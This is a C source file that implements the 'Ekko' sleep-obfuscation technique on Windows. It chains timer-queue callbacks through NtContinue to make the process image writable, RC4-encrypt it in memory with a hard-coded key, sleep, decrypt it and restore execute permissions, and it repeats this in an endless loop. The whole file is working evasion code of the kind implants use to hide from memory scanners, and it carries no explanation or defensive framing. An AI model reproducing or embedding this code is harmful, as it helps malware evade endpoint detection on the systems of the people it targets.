#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include "extras.h"

void EkkoFunction(DWORD TIME_TO_SLEEP) {
	CONTEXT OriginalContext = { 0 };

	CONTEXT RopProtRW = { 0 };
    CONTEXT RopMemEnc = { 0 };
    CONTEXT RopDelay = { 0 };
    CONTEXT RopMemDec = { 0 };
    CONTEXT RopProtRX = { 0 };
    CONTEXT RopSetEvt = { 0 };

	HANDLE hTimerQueue = NULL;
	HANDLE hTimer = NULL;
	HANDLE hEvent = NULL;
	PVOID ImageBase = NULL;
	DWORD ImageSize = 0;
	DWORD OldProtect = 0;
	
	PVOID NtContinue = NULL;
	PVOID Sysfunc032 = NULL;
	
	hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
	hTimerQueue = CreateTimerQueue();

	NtContinue = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtContinue");
	Sysfunc032 = GetProcAddress(LoadLibraryA("advapi32.dll"), "SystemFunction032");

	USTRING Key, Img;
	CHAR KeyBuf[16] = {0xde,0xad,0xbe,0xef,0xca,0xfe,0xba,0xbe,0xde,0xad,0xbe,0xef,0xca,0xfe,0xba,0xbe};
	Key.Buffer = KeyBuf;
	Key.Length = Key.MaximumLength = 16;

	info("Starting EkkoFunction...");
	ImageBase = GetModuleHandleA(NULL);
	ImageSize = ((PIMAGE_NT_HEADERS)((BYTE*)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew))->OptionalHeader.SizeOfImage;

	Img.Buffer = ImageBase;
	Img.Length = Img.MaximumLength = ImageSize;

	if (CreateTimerQueueTimer(&hTimer, hTimerQueue, RtlCaptureContext, &OriginalContext, 0, 0, WT_EXECUTEINTIMERTHREAD)) {
		info("Context captured successfully");
		//WaitForSingleObject(hEvent, TIME_TO_SLEEP);

		//Copying current context into multiple copies for different ROP chains
		memcpy(&RopProtRW, &OriginalContext, sizeof(CONTEXT));
		memcpy(&RopMemEnc, &OriginalContext, sizeof(CONTEXT));
		memcpy(&RopDelay, &OriginalContext, sizeof(CONTEXT));
		memcpy(&RopMemDec, &OriginalContext, sizeof(CONTEXT));
		memcpy(&RopProtRX, &OriginalContext, sizeof(CONTEXT));
		memcpy(&RopSetEvt, &OriginalContext, sizeof(CONTEXT));

		// VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
		RopProtRW.Rsp -= 8;
		RopProtRW.Rip = VirtualProtect;
		RopProtRW.Rcx = ImageBase;
		RopProtRW.Rdx = ImageSize;
		RopProtRW.R8 = PAGE_READWRITE;
		RopProtRW.R9 = &OldProtect;

		// SystemFunction032 (&Key, &Img);
		RopMemEnc.Rsp -= 8;
		RopMemEnc.Rip = Sysfunc032;
		RopMemEnc.Rcx = (DWORD64)&Key;
		RopMemEnc.Rdx = (DWORD64)&Img;

		// Sleep( TIME_TO_SLEEP );
		RopDelay.Rsp -= 8;
		RopDelay.Rip = WaitForSingleObject;
		RopDelay.Rcx = NtCurrentProcess();
		RopDelay.Rdx = TIME_TO_SLEEP;

		// SystemFunction032 (&Key, &Img);
		RopMemDec.Rsp -= 8;
		RopMemDec.Rip = Sysfunc032;
		RopMemDec.Rcx = (DWORD64)&Key;
		RopMemDec.Rdx = (DWORD64)&Img;

		// VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READ, &OldProtect );
		RopProtRX.Rsp -= 8;
		RopProtRX.Rip = VirtualProtect;
		RopProtRX.Rcx = (DWORD64)ImageBase;
		RopProtRX.Rdx = ImageSize;
		RopProtRX.R8 = PAGE_EXECUTE_READ;
		RopProtRX.R9 = (DWORD64)&OldProtect;

		// SetEvent( hEvent );
		RopSetEvt.Rsp -= 8;
		RopSetEvt.Rip = SetEvent;
		RopSetEvt.Rcx = (DWORD64)hEvent;

		ok("Starting ROP chains via NtContinue...");

		//CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopDelay, 0, 0, WT_EXECUTEINTIMERTHREAD);
		CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD);
		CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD);
		CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopDelay, 300, 0, WT_EXECUTEINTIMERTHREAD);
		CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD);
		CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD);
		CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD);

		ok("ROP chains initiated successfully.");
		ok("Waiting for hEvent");

		WaitForSingleObject(hEvent, INFINITE);

		ok("hEvent signaled. Exiting EkkoFunction.");
	}else {
		error("CreateTimerQueueTimer failed.");
		yolo();
	}

	DeleteTimerQueue(hTimerQueue);
}

int main() {
	do {
		EkkoFunction(4 * 1000);
	} while (TRUE);
	return 0;
}